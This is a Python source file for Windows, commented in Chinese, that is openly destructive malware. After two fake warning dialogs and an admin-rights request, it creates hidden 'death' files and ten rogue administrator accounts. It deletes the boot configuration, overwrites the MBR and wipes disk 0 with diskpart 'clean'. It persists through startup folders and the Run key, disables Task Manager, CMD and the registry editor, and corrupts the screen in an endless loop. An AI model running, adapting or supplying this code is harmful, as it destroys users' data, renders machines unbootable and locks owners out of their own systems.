import ctypes
import random
import time
import win32api
import win32con
import win32gui
import win32ui
import os
import subprocess
import sys
import shutil

# 常量定义
SM_CXSCREEN = 0
SM_CYSCREEN = 1
IDI_ERROR = 32513

def show_confirmation_dialogs():
    # 第一个确认对话框
    response1 = ctypes.windll.user32.MessageBoxW(0, "系统检测到异常，是否继续?", "安全警告", 1)
    # 第二个确认对话框
    response2 = ctypes.windll.user32.MessageBoxW(0, "继续操作可能导致数据丢失，确认继续?", "严重警告", 1)
    
    return response1 == 1 and response2 == 1  # IDOK = 1

def disable_system_functions():
    try:
        # 禁用任务管理器（使用管理员权限）
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 
                       '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True, check=True)
        
        # 更有效的方法禁用关机/重启（修改多个注册表项）
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                       '/v', 'NoClose', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True, check=True)
        subprocess.run(['reg', 'add', 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                       '/v', 'NoClose', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True, check=True)
        
        # 禁用Win+R
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                       '/v', 'NoWinKeys', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True, check=True)
        
        # 禁用Alt+F4
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                       '/v', 'NoViewContextMenu', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True, check=True)
        
        # 交换鼠标左右键
        subprocess.run(['reg', 'add', 'HKCU\\Control Panel\\Mouse', 
                       '/v', 'SwapMouseButtons', '/t', 'REG_SZ', '/d', '1', '/f'], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"注册表修改失败: {e}")

def disable_cmd_regedit():
    try:
        # 禁用CMD（使用更可靠的方法）
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System', 
                       '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '2', '/f'], shell=True, check=True)
        subprocess.run(['reg', 'add', 'HKLM\\Software\\Policies\\Microsoft\\Windows\\System', 
                       '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '2', '/f'], shell=True, check=True)
        
        # 禁用注册表编辑器（同时修改HKCU和HKLM）
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 
                       '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True, check=True)
        subprocess.run(['reg', 'add', 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 
                       '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"禁用CMD和注册表失败: {e}")

def create_death_files():
    try:
        desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
        if not os.path.exists(desktop):
            desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
        
        for i in range(1, 51):
            file_path = os.path.join(desktop, f'death{i}.txt')
            with open(file_path, 'w') as f:
                f.write('YOUR SYSTEM HAS BEEN COMPROMISED')
            
            # 设置文件为隐藏和系统属性
            subprocess.run(['attrib', '+h', '+s', file_path], shell=True)
    except Exception as e:
        print(f"创建文件失败: {e}")

def set_black_wallpaper():
    try:
        # 创建纯黑色壁纸
        image_path = os.path.join(os.getenv('TEMP'), 'black_wallpaper.bmp')
        with open(image_path, 'wb') as f:
            # 简单的24位位图头部和黑色像素数据
            f.write(b'BM' + (54 + 3 * 1024 * 768).to_bytes(4, 'little') + b'\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00' + 
                    (1024).to_bytes(4, 'little') + (768).to_bytes(4, 'little') + b'\x01\x00\x18\x00\x00\x00\x00\x00' + 
                    (3 * 1024 * 768).to_bytes(4, 'little') + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            # 写入黑色像素数据
            for _ in range(1024 * 768):
                f.write(b'\x00\x00\x00')
        
        # 设置壁纸（使用更可靠的方法）
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        # 强制刷新
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 0)
    except Exception as e:
        print(f"设置壁纸失败: {e}")

def create_users():
    try:
        for i in range(1, 11):
            username = f'death{i}'
            password = 'P@ssw0rd!123'
            # 使用更可靠的命令创建用户
            subprocess.run(['net', 'user', username, password, '/add', '/active:yes'], shell=True, check=True)
            subprocess.run(['net', 'localgroup', 'Administrators', username, '/add'], shell=True, check=True)
            # 设置用户密码永不过期
            subprocess.run(['wmic', 'useraccount', 'where', f'name="{username}"', 'set', 'PasswordExpires=False'], shell=True)
    except subprocess.CalledProcessError as e:
        print(f"创建用户失败: {e}")

def set_red_theme():
    try:
        # 更全面的主题修改
        # 设置红色主题颜色
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\DWM', 
                       '/v', 'ColorizationColor', '/t', 'REG_DWORD', '/d', '0x000000FF', '/f'], shell=True, check=True)
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\DWM', 
                       '/v', 'ColorizationAfterglow', '/t', 'REG_DWORD', '/d', '0x000000FF', '/f'], shell=True, check=True)
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\DWM', 
                       '/v', 'ColorizationColorBalance', '/t', 'REG_DWORD', '/d', '100', '/f'], shell=True, check=True)
        
        # 设置红色背景
        subprocess.run(['reg', 'add', 'HKCU\\Control Panel\\Colors', 
                       '/v', 'Background', '/t', 'REG_SZ', '/d', '255 0 0', '/f'], shell=True, check=True)
        
        # 设置红色窗口边框
        subprocess.run(['reg', 'add', 'HKCU\\Control Panel\\Colors', 
                       '/v', 'ActiveBorder', '/t', 'REG_SZ', '/d', '255 0 0', '/f'], shell=True, check=True)
        
        # 刷新主题
        subprocess.run(['rundll32.exe', 'user32.dll,UpdatePerUserSystemParameters'], shell=True)
    except subprocess.CalledProcessError as e:
        print(f"修改主题失败: {e}")

def delete_bootloader():
    try:
        # 更可靠的引导删除方法
        subprocess.run(['bcdedit', '/delete', '{current}', '/f'], shell=True, check=True)
        subprocess.run(['bootsect', '/nt60', 'sys', '/mbr'], shell=True)
    except subprocess.CalledProcessError as e:
        print(f"删除引导失败: {e}")

def add_to_startup():
    try:
        # 添加到多个启动位置
        startup_path1 = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.vbs')
        with open(startup_path1, 'w') as f:
            f.write(f'CreateObject("WScript.Shell").Run "{sys.executable} {os.path.abspath(__file__)}", 0, False')
        
        startup_path2 = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\malware.vbs'
        with open(startup_path2, 'w') as f:
            f.write(f'CreateObject("WScript.Shell").Run "{sys.executable} {os.path.abspath(__file__)}", 0, False')
        
        # 添加到注册表启动项
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 
                       '/v', 'Malware', '/t', 'REG_SZ', '/d', f'"{sys.executable}" "{os.path.abspath(__file__)}"', '/f'], shell=True)
    except Exception as e:
        print(f"添加启动项失败: {e}")

def delete_partitions():
    try:
        # 更可靠的分区删除方法
        script = """
        select disk 0
        clean
        exit
        """
        with open('clean.txt', 'w') as f:
            f.write(script)
        subprocess.run(['diskpart', '/s', 'clean.txt'], shell=True, check=True)
        os.remove('clean.txt')
    except Exception as e:
        print(f"删除分区失败: {e}")

def main():
    if not show_confirmation_dialogs():
        sys.exit(0)
    
    # 检查管理员权限
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("需要管理员权限")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit(0)
    except:
        print("管理员权限检查失败")
    
    # 执行破坏性操作（调整后的顺序）
    create_death_files()
    set_black_wallpaper()
    create_users()
    set_red_theme()
    delete_bootloader()
    add_to_startup()
    delete_partitions()
    disable_system_functions()
    
    # 最后才禁用CMD和注册表编辑器
    disable_cmd_regedit()
    
    # 原始特效代码
    width = ctypes.windll.user32.GetSystemMetrics(SM_CXSCREEN)
    height = ctypes.windll.user32.GetSystemMetrics(SM_CYSCREEN)
    hwnd = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(hwnd)
    delay = 400
    last_speed_change = time.time()
    speed_level = 1
    
    while True:
        current_time = time.time()
        if current_time - last_speed_change > 10:
            delay = max(50, delay - 50)
            last_speed_change = current_time
            speed_level += 1
        
        cursor_pos = win32api.GetCursorPos()
        icon = ctypes.windll.user32.LoadIconW(0, IDI_ERROR)
        ctypes.windll.user32.DrawIcon(hdc, cursor_pos[0] - 5, cursor_pos[1] - 5, icon)
        
        randx = random.randint(0, width)
        randy = random.randint(0, height)
        screen_dc = win32gui.GetDC(0)
        
        win32gui.BitBlt(
            screen_dc, random.randint(0, width), random.randint(0, height), 
            randx + 200, randy + 200, screen_dc, randx, randy, win32con.NOTSRCCOPY
        )
        
        a = ctypes.windll.user32.GetSystemMetrics(SM_CXSCREEN)
        b = ctypes.windll.user32.GetSystemMetrics(SM_CYSCREEN)
        
        win32gui.StretchBlt(
            screen_dc, 50, 50, a - 100, b - 100, 
            screen_dc, 0, 0, a, b, win32con.SRCCOPY
        )
        
        win32gui.ReleaseDC(0, screen_dc)
        time.sleep(delay / 1000)

if __name__ == "__main__":
    main()